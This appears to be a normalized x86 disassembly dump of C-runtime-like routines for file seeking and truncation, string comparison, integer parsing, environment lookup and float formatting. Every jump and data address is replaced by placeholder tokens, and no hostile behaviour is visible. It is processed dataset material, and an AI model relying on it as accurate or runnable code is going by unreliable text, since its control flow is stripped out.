push [ esi ]
call sub_1002f4a7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_1002f6f7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_10035bda
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_10035bda
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_1003981b
push 0x14
push r--data
call sub_1002ca38
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_1002972b
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_1002ca7d
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_100390fb
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100398b9
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_100398b9
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_10036f99
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_100398e7
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1003981b
add esp 0x18
pop ebp
retn
sub_10039907
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_1003b040
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_1003b040
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_100399f1
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10039907
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_10039a97
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10039ace
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_10027728
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_10031499
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1002972b
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_10039cfd
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10039ace
add esp 0x14
pop ebp
retn
sub_10039d47
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_10039d74
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_10035bda
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1002972b
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10035bda
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_10035bda
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10035bda
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_10039f2a
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1002972b
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10036e82
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1002972b
mov [ eax ] 0xd
call sub_1002973e
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1002973e
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1002972b
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1002ed74
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10039f2a
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_10039f2a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_10039fe6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003a01f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10024630
pop ecx
mov edi eax
jmp r-xdata
call sub_1003b1fd
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10024630
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_1003b1e3
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_1003a0b0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1003a111
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002b660
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002b660
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
